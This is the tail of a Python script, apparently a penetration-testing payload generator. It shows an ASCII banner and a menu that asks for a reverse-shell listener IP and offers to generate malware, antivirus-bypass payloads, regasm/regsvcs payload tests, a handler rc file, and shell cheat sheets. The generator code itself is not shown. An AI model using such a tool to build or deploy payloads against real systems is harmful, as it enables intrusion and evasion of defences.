        __ _| \  / |  /  \  | |     __ _  __ _ _ __ ___   ___  _   _ ___ 
       / _` | |\/| | / /\ \ | |    / _` |/ _` | '_ ` _ \ / _ \| | | / __|
      | (_| | |  | |/ ____ \| |___| (_| | (_| | | | | | | (_) | |_| \__ \

       \__,_|_|  |_/_/    \_\______\__, |\__,_|_| |_| |_|\___/ \__,_|___/
                                    __/ |                                
                                   |___/                                 

""" + bcolors.ENDC)
  print(bcolors.GREEN+"""\
                    _____             __         __  ___      
                   / ___/______ ___ _/ /____ ___/ / / _ )__ __
                  / /__/ __/ -_) _ `/ __/ -_) _  / / _  / // /
                  \___/_/  \__/\_,_/\__/\__/\_,_/ /____/\_, / 
                                                       /___/  
             __  ___                   __           __  ________      
            /  |/  /__ ________ ____  / /________ _/ / /_  __/ /  ___ 
           / /|_/ / _ `/ __/ _ `/ _ \/ __/ __/ _ `/ /   / / / _ \/ -_)
          /_/  /_/\_,_/_/  \_,_/_//_/\__/_/  \_,_/_/   /_/ /_//_/\__/ 
                                                                      
                        __  ___          __           ____
                       /  |/  /__ ____  / /________  / / /
                      / /|_/ / _ `/ _ \/ __/ __/ _ \/ / / 
                     /_/  /_/\_,_/_//_/\__/_/  \___/_/_/  
                                                          
""" + bcolors.ENDC)
  print("""\
                   Thanks all that helped and to the tidepod.
                    NSTS Cyber Security Penetration Testers
                                 version0.1
""")

  if (listener_ip == "127.0.0.1"):
      local_ip = get_local_ip(interface)
      listener_ip = input("Enter IP Address for the Listenser (%s): " % local_ip) or local_ip

  print("\n\tYOU HAVE SET THE LHOST TO:   %s " % listener_ip)

  while(1):
    print("\t*******************************************************************")
    print("\t*******************************************************************")
    print("\t*******************************************************************")
    print("\t(1)\tGenerate all Malware-----(this would be for a malware test)")
    print("\t(2)\tGenerate only Bypass-----(this would be for Pen test)")
    print("\t(3)\tGenerate Marantal the Mantroll Special-----(my fav stuff)")
    print("\t(4)\tTest regasm & regsvcs payloads-----(Testing)")
    print("\t(5)\tShell Cheat ===========(gives you shells to put in)")
    print("\t(9)\tYou don't want to do anything----------(DUMB)")
    print("\t*******************************************************************")

    options = int(input("\nPiCk y0u4 Po1$oN: "))

    if options == 1:
       gen_000()
       gen_010()
       gen_020()
       gen_020()
       gen_100()
       gen_200()
       gen_210()
       gen_300()
       gen_320()
       gen_330()
       gen_340()
       gen_350()
       gen_360()
       gen_400()
       gen_410()
       gen_420()
       gen_430()
       gen_440()
       rc_file()
    elif options == 2:
       gen_300()
       gen_320()
       gen_330()
       gen_340()
       gen_350()
       gen_360()
       gen_400()
       gen_410()
       gen_420()
       gen_430()
       gen_440()
       rc_file()
    elif options == 3:
       gen_300()
       gen_320()
       gen_340()
       gen_400()
       gen_410()
       gen_420()
       rc_file()
    elif options == 4:
       gen_430()
       gen_440()
       rc_file()
    elif options == 5:
       Shells()
    elif options == 9:
       exit()
    else:
       input("BAHHHHH PICK SOMETHING!!!!!!...")

#call main() function 
if __name__ == '__main__':
  main()

